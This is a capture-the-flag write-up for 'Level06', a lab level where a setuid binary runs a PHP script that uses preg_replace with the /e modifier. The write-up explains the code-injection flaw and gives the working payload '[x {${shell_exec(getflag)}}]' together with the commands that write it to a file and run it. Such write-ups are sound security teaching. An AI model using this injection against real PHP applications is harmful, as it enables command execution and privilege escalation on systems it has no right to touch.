# Level06

## Context
Content of `/home/user/level06` :
```
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

And here is the content of level06.php:
```php
#!/usr/bin/php
<?php
        function y($m) {
                $m = preg_replace("/\./", " x ", $m);
                $m = preg_replace("/@/", " y", $m);
                return $m;
        }
        function x($y, $z) {
                $a = file_get_contents($y);
                $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
                $a = preg_replace("/\[/", "(", $a);
                $a = preg_replace("/\]/", ")", $a);
                return $a;
        }
        $r = x($argv[1], $argv[2]);
        print $r;
?>
```


## Resolution
 * We observe that the binary 'level06' has suid rights, and is part of the flag06 group.
Which means if we get it to execute `getflag` we will solve this level.
 * It works with a path_to_file in 1st argument, which will be evaluated through multiple REGEX expression.
 * In function x, the first preg_replace has the option e. This means it will execute his output (after replacement). 
   * It will match with this pattern : `[x our_malicious_code]`
   * https://www.php.net/manual/fr/reference.pcre.pattern.modifiers.php in the docs, we have an example of malicious use of this vulnerability : `${eval($_GET[php_code])}}`
   * For us to be able to execute `getflag` we will use `shell_exec()` : https://www.php.net/manual/en/function.shell-exec.php
 * By trying a couple of combinaison we find this successfull file content: ```[x {${shell_exec(getflag)}}]```, that we put in a file:  ```echo '[x {${shell_exec(getflag)}}]' > /var/crash/level06_solution```. which makes `./level06 /var/crash/level06_solution` to output the flag we are looking for.

 
